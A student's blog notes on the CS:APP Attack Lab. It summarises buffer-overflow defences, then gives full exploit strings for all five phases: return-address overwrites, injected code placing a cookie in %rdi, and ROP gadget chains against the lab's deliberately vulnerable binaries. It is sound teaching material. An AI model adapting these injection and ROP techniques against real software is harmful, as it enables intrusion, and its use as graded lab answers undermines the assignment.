---
title: Lab 3 Attack Lab
date: 2021-02-01 08:51:48
tags: 
- CSAPP

categories: 
- Study

sidebar: True
lang: en-US
---


<!--more-->


## Textbook 3.10 Combining Control and Data in Machine-level Programs

- Function Pointers
  ```C
  int fun(int x, int *p);
  
  int (*fp)(int, int *);
  fp = fun;
  
  int y = 1;
  int result = fp(3, &y);
  ```
- Out of bounds memory and buffer overflow leaves program vulnerable to attacks
- by corrupting the `ret` address
- To thwart buffer overflow attacks
  - **stack randomization**: make it harder for attacker to guess the exact ret address, attackers may use `nop sled` to bypass it
  - **stack corruption detection**  maintain a `canary` value, to check whether buffer overflows
  - **limit executable code regions** three mode of access in instructions for memory: read/write/execute. For historic reasons, x86 will introduce significant inefficiencies while AMD NX(no-execute) bit has no peanalty in efficiency

- To support variable stack size, `$rbp` is used as a frame pointer. Earlier versions of code always uses `$rbp`, while in x86-64 codes, it is used only when stack is of variable size. 


## Attack 1

By making a breakpoint at `getbuf`, we can know the location of return address in the stack frame. We simply fill the buffer area and make an overflow to overwrite the return address to the entry of touch1.

The entry of `touch1` can be found through `disas touch1`.

```
01 00 00 00 00 00 00 00 
02 00 00 00 00 00 00 00 
03 00 00 00 00 00 00 00 
04 00 00 00 00 00 00 00 
05 00 00 00 00 00 00 00 # buf
c0 17 40 00 00 00 00 00 # return add of touch1
```


## Attack 2

The code we will inject is as follows. We put them at the beginning of the buffer area, and then overwrite the return address with the pointer to the beginning of our injection code. At the end of our code, we will call a `ret` instruction. It will check the return address on `%rsp-8`.

In order to jump to `touch2` function, in addition to the return address of our injection code, we also need to overwrite an address to the entry of `touch2` below that return address.


```
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi
   7:   00 
   8:   c3                      retq   
```

```
48 8b 3c 25 e4 44 60 00 # mov cookie to rdi and ret
c3 00 00 00 00 00 00 00 # jmp to ret address
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 # return to inj code (buf at line 1)
ec 17 40 00 00 00 00 00 # (on return) jmp destination
```

## Attack 3

Here we need to pass a pointer instead of a value to the `touch3` function.

```
0000000000000000 <.text>:
   0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi  # address of cookie string
   b:   c3                      retq   
```

The address should point to a string in the stack frame. Here we append a cookie string at the end of the input. We can locate the address of that string in gdb, so that we can finish encoding the injection code.

```
48 c7 c7 b0 dc 61 55 c3 # mov cookie to rdi and ret
00 00 00 00 00 00 00 00 # jmp
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 # return to inj code (buf at line 1)
fa 18 40 00 00 00 00 00 # (on return) jmp destination
35 39 62 39 39 37 66 61 # <- beg of cookie string
00
```
::: tip
Note that our input string is at a higher address of the stack. Therefore, future function calls that may modify the stack will not interfere with our string. Therefore, the `00` buffer space is not a desired place for the cookie string, since it will be popped when `getbuf` is returned. 
:::

### Attack 4

We first use `objdump -h rtarget` to check the instructions provided by the `farm.c`. After some efforts in observation, we have found two useful utilities.

```
(gdb) x /3i 0x4019ab
   0x4019ab <addval_219+4>:     pop    %rax
   0x4019ac <addval_219+5>:     nop
   0x4019ad <addval_219+6>:     retq 
```

```
(gdb) x /2i 0x4019a3
   0x4019a3 <addval_273+3>:     mov    %eax,%edi
   0x4019a5 <addval_273+5>:     retq   
```

The return-oriented programming is designed as follows. First, we pop a value (the cookie as integer) from stack to a register`%eax`. Then the stack frame pointer will move down a byte. Then it will be redirected to the next utility that pass the value in `%eax` to function argument `%edi`. Then we call the function `touch2`, the attack is done.

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
ab 19 40 00 00 00 00 00 # return to rax
fa 97 b9 59 00 00 00 00 # pop to rax
a3 19 40 00 00 00 00 00 # return to mov 
ec 17 40 00 00 00 00 00 # return to touch2
```


## Attack 5

By comparing the helper table in Appendix 2 and the instructions in `farm.c`, we can identify two parameter passing chains. One for `movl` and one for `movq`. Both start from `%rax`, where there is a `pop %rax` utility to make use of.

The attack scheme is designed as follows.

### Move rsp pointer to rdi

First, we need to store a `rsp` pointer that points to the cookie string so that we can pass it to the argument of `touch3`. We should move that `rsp` to a register. Note that the `rsp` can be quite large, so we should use the `movl` chain.

```
gdb) x /2i 0x401a06
   0x401a06 <addval_190+3>:     mov    %rsp,%rax
   0x401a09 <addval_190+6>:     retq  
(gdb) x /3i 0x4019a2
   0x4019a2 <addval_273+2>:     mov    %rax,%rdi
   0x4019a5 <addval_273+5>:     retq   
   0x4019a6 <addval_273+6>:     retq 
```

### Move Small number to rsi

Note that `rsp` keeps changing, so an offset is needed. Luckily, we have a utility function `add_xy`. We can make use of the `movl` chain to load an offset and add it to the previously obtained `rsp`.

```
(gdb) x /2i 0x401a07
   0x401a07 <addval_190+4>:     mov    %esp,%eax
   0x401a09 <addval_190+6>:     retq  
(gdb) x /3i 0x401a42
   0x401a42 <addval_487+2>:     mov    %eax,%edx
   0x401a44 <addval_487+4>:     test   %al,%al
   0x401a46 <addval_487+6>:     retq
(gdb) x /3i 0x401a69
   0x401a69 <getval_311+1>:     mov    %edx,%ecx
   0x401a6b <getval_311+3>:     or     %bl,%bl
   0x401a6d <getval_311+5>:     retq  
(gdb) x /3i 0x401a27
   0x401a27 <addval_187+2>:     mov    %ecx,%esi
   0x401a29 <addval_187+4>:     cmp    %al,%al
   0x401a2b <addval_187+6>:     retq  
```

```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```


### Solution

As before, the cookie string will be stored at the highest address. We obtain an `rsp` value first, then calculate the offset. By adding them together and passing the result to `touch3`, the attack is done.

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  
06 1a 40 00 00 00 00 00 # [mov %rsp, %rax], offset from here
a2 19 40 00 00 00 00 00 # [mov %rax, %rdi]
ab 19 40 00 00 00 00 00 # return to [pop %rax]
48 00 00 00 00 00 00 00 # pop the offset to %rax
42 1a 40 00 00 00 00 00 # [mov %eax, %edx]
69 1a 40 00 00 00 00 00 # [mov %edx, %ecx]
27 1a 40 00 00 00 00 00 # [mov %ecx, %esi]
d6 19 40 00 00 00 00 00 # call [add_xy] to add rsp and offset to %eax
a2 19 40 00 00 00 00 00 # [mov %rax, %rdi]
fa 18 40 00 00 00 00 00 # return to touch3
35 39 62 39 39 37 66 61 # [object string], offset to here
00 00 00 00 00 00 00 00
```